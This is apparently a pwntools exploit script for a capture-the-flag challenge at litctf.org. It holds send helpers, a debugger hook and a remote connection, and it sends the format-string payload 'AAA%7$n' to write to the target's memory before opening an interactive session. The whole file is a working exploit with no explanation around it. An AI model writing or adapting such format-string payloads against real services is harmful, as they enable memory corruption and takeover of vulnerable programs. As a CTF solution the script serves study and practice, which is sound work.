#!/usr/bin/env python3

from pwn import *

exe = ELF('./main',checksec = False)
#libc = ELF('',checksec = False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc = None : proc.sendafter(msg,data) if proc else p.sendafter(msg,data)
sl = lambda data,proc = None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc = None: proc.sendlineafter(msg,data) if proc else p.sendlineafter(msg,data)
sn = lambda num, proc = None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg,num, proc = None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc = None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc = None: proc.sendlineafter(msg,str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode)
def GDB():
	if not args.REMOTE:
		gdb.attach(p, gdbscript = '''
			b*0x0000555555555286
			c
		''')
		input()

server = 'litctf.org'	
port = 31785

if args.REMOTE:
	if server == '' or port == 0:
		print('Please sign server and port !!')
		exit(1)
	else: p = remote(server,port)
else:
	p = process(exe.path)

GDB()
payload = f'AAA%7$n'.encode()
sl(payload)

p.interactive()

